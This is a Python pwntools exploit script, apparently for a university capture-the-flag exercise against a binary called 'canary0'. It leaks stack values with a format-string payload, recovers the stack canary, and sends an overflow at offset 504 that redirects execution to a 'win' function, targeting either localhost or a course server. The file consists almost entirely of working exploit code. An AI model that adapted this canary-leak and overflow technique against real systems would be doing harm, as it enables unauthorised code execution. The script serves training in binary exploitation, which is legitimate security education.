#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template canary0
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'canary0')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote('lettieri.iet.unipi.it', 4410)
    else:
        return remote('localhost', 4410)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

# canary: 0xfd80c70570f1400

io = start()

io.sendline(b'%p.' * 100)
res = io.recv(2_000_000).replace(b'.', b'\n')

pointers = res.decode().split("\n")

# use canary from gdb
for i, v in enumerate(pointers):
    print(i, v.encode())

canary = int(pointers[46], 16)

print(hex(canary))

# use cyclic, the canary is at 504
io.close()

io = start()

io.sendline(flat({
    504 : [
        canary,
        0x0,
        0x401282  # p win in gdb
    ],
}))

io.interactive()

